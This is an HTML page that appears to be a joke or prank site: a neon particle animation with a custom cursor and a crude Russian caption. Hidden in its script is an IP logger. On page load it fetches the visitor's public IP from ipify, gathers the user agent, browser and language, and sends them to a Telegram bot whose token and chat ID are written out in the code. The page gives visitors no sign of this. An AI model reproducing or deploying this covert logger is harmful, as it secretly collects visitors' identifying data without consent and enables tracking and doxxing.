<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>пр</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            background: #000;
            overflow: hidden;
            color: #fff;
            font-family: 'Arial', sans-serif;
            cursor: none;
        }
        #particles-js {
            position: absolute;
            width: 100%;
            height: 100%;
        }
        .content {
            position: relative;
            text-align: center;
            top: 50%;
            transform: translateY(-50%);
            z-index: 2;
        }
        h1 {
            font-size: 4em;
            text-shadow: 0 0 20px #ff00ff;
            animation: glow 2s infinite alternate;
        }
        p {
            font-size: 1.5em;
            text-shadow: 0 0 10px #00ffff;
        }
        @keyframes glow {
            from { text-shadow: 0 0 20px #ff00ff; }
            to { text-shadow: 0 0 30px #ff00ff, 0 0 40px #00ffff; }
        }
        .custom-cursor {
            position: fixed;
            width: 30px;
            height: 30px;
            background: radial-gradient(circle, #ff00ff, #00ffff);
            border-radius: 50%;
            pointer-events: none;
            z-index: 9999;
            mix-blend-mode: difference;
            transition: transform 0.1s ease;
            box-shadow: 0 0 20px #ff00ff;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
</head>
<body>
    <div id="particles-js"></div>
    <div class="content">
        <h1>пр етооо</h1>
        <p>сиски рейза</p>
    </div>
    <div class="custom-cursor"></div>

    <script>
        // Particles background
        particlesJS("particles-js", {
            "particles": {
                "number": { "value": 100, "density": { "enable": true, "value_area": 800 } },
                "color": { "value": ["#ff00ff", "#00ffff", "#ffff00"] },
                "shape": { "type": "circle" },
                "opacity": { "value": 0.6, "random": true },
                "size": { "value": 4, "random": true },
                "line_linked": { "enable": true, "distance": 150, "color": "#00ffff", "opacity": 0.4, "width": 1 },
                "move": { "enable": true, "speed": 3, "direction": "none", "random": true }
            },
            "interactivity": {
                "detect_on": "canvas",
                "events": {
                    "onhover": { "enable": true, "mode": "repulse" },
                    "onclick": { "enable": true, "mode": "push" },
                    "resize": true
                }
            },
            "retina_detect": true
        });

        // Animated cursor
        const cursor = document.querySelector('.custom-cursor');
        document.addEventListener('mousemove', e => {
            cursor.style.left = e.clientX + 'px';
            cursor.style.top = e.clientY + 'px';
            cursor.style.transform = 'translate(-50%, -50%) scale(1.2)';
        });

        // IP Logger (отправка в Telegram)
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const userAgent = navigator.userAgent;
                const browser = navigator.appName + ' ' + navigator.appVersion;
                const lang = navigator.language;

                const logMessage = `Новый лог!\nIP: ${ip}\nБраузер: ${browser}\nЯзык: ${lang}\nUA: ${userAgent}`;

                // Замени на свой бот токен и chat_id
                const botToken = "8390333845:AAH8XO7Jo7iv2z_b0CjmUa2_yqmoqa0jMM0";  // <-- Твой токен
                const chatId = "8146012399";      // <-- Твой chat_id

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(logMessage)}`)
                    .then(() => console.log("Лог отправлен"))
                    .catch(err => console.log("Ошибка отправки"));
            });
    </script>
</body>
</html>
